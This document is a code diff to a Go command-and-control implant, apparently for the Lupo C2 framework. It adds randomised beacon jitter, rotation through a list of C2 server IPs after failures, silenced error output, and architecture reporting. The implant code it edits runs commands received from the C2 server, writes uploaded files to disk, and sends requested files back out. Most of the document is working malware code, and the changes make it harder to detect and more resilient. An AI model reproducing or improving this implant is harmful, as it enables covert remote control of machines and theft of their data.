@@ -5,7 +5,7 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
-	"fmt"
+	//"fmt"
 	"io/ioutil"
 	"net/http"
 	"net/url"
@@ -15,6 +15,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"math/rand"
 
 	"github.com/mattn/go-shellwords"
 )
@@ -35,18 +36,32 @@ var implant *lupoImplant
 
 func main() {
 
+
+	var ipList = []string{"192.168.3.165", "127.0.0.1", "10.0.0.3"}
+	var currentIPIndex = 0
+	var failureCount = 0
+	var updateInterval = 1
 	// Construct implant
 
 	implant = &lupoImplant{
-		updateInterval: 1,
+		updateInterval: updateInterval,
 		protocol:       "https://",
-		rhost:          "127.0.0.1",
+		rhost:          ipList[0],
 		rport:          1337,
 		id:             -1,
 		uuid:           "",
 		psk:            "wolfpack",
 		data:           "",
 	}
+
+    
+	jitterMin := 5
+	jitterMax := 25
+
+
+	
+
+
 
 	// If a root certificate is specified, use it
 	config := &tls.Config{}
@@ -64,12 +79,34 @@ func main() {
 	}
 
 	for {
-		ExecLoop(implant, client)
+
+		rand.Seed(time.Now().UnixNano())
+
+		jitter := rand.Intn(jitterMax-jitterMin+1)+jitterMin
+
+		implant.updateInterval =  updateInterval + jitter
+
+		success := ExecLoop(implant, client)
+
+		if success{
+			failureCount = 0
+		}else {
+			failureCount ++
+
+			if failureCount >=10{
+				currentIPIndex = (currentIPIndex + 1) % len(ipList)
+				implant.rhost = ipList[currentIPIndex]
+				failureCount = 0
+			}
+		}
+
 		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
+
+		
 	}
 }
 
-func ExecLoop(implant *lupoImplant, client *http.Client) {
+func ExecLoop(implant *lupoImplant, client *http.Client) bool {
 
 	var requestUrl string
 	var requestParams string
@@ -77,9 +114,10 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 	connectionString := implant.protocol + implant.rhost + ":" + strconv.Itoa(implant.rport)
 
-	if implant.id == -1 {
+	arch := getArchitecture()
 
-		arch := getArchitecture()
+
+	if implant.id == -1 {
 
 		// Build custom user defined functions
 		customFunctions := buildCustomFunctions()
@@ -91,21 +129,21 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 		resp, err := client.Get(requestUrl)
 
 		if err != nil {
-			fmt.Println(err)
-			return
+			//fmt.Println(err)
+			return false
 		}
 
 		jsonData, err := ioutil.ReadAll(resp.Body)
 
 		if err != nil {
-			return
+			return true
 		}
 
 		// Parse the JSON response
 		err = json.Unmarshal(jsonData, &serverResponse)
 
 		if err != nil {
-			return
+			return true
 		}
 
 		// set the new session info for the implant structure
@@ -114,19 +152,19 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 	} else {
 		// Request new data from the C2 sending all auth in the form of PSK, sessionID, and UUID
-		requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid
+		requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&arch=" + arch
 		requestUrl = connectionString + requestParams
 
 		resp, err := client.Get(requestUrl)
 
 		if err != nil {
-			return
+			return true
 		}
 
 		jsonData, err := ioutil.ReadAll(resp.Body)
 
 		if err != nil {
-			return
+			return true
 		}
 
 		// We are only expecting raw cmd execution for this basic implant so the only use case is to parse cmd JSON response
@@ -134,14 +172,14 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 		err = json.Unmarshal(jsonData, &serverResponse)
 
 		if err != nil {
-			return
+			return true
 		}
 
 		// In case of server side issue where we request a session reconnect, set the new session info for the implant structure
 		if serverResponse["UUID"] != nil {
 			implant.id = int(serverResponse["sessionID"].(float64))
 			implant.uuid = serverResponse["UUID"].(string)
-			return
+			return true
 		}
 
 		unparsedCmd := serverResponse["cmd"].(string)
@@ -167,7 +205,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			var fileString string
 
 			if err != nil {
-				return
+				return true
 			}
 
 			// Check if it is a command with our without args and execute appropriately
@@ -181,20 +219,20 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 					fileb64, err := base64.StdEncoding.DecodeString(strings.Join(argS[1:], " "))
 					if err != nil {
-						return
+						return true
 					}
 
 					f, err := os.Create(filename)
 					if err != nil {
-						return
+						return true
 					}
 					defer f.Close()
 
 					if _, err := f.Write(fileb64); err != nil {
-						return
+						return true
 					}
 					if err := f.Sync(); err != nil {
-						return
+						return true
 					}
 				} else if cmd == "download" {
 					filename := argS[0]
@@ -203,7 +241,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 					f, err := os.Open(filename)
 
 					if err != nil {
-						return
+						return true
 					}
 
 					reader := bufio.NewReader(f)
@@ -217,7 +255,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 				} else if cmd == "updateinterval" {
 					implant.updateInterval, err = strconv.Atoi(argS[0])
 					if err != nil {
-						return
+						return true
 					}
 					dataString = "Implant interval updated to: " + strconv.Itoa(implant.updateInterval)
 				} else {
@@ -243,17 +281,19 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			}
 
 			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
-			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&user=" + operator + dataString + fileString
+			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&user=" + operator + dataString + fileString + "&arch=" + arch
 			requestUrl = connectionString + requestParams
 
 			resp, err = client.Get(requestUrl)
 
 			if err != nil {
-				return
+				return true
 			}
 
 		}
 	}
+
+	return true
 }
 
 func getArchitecture() string {
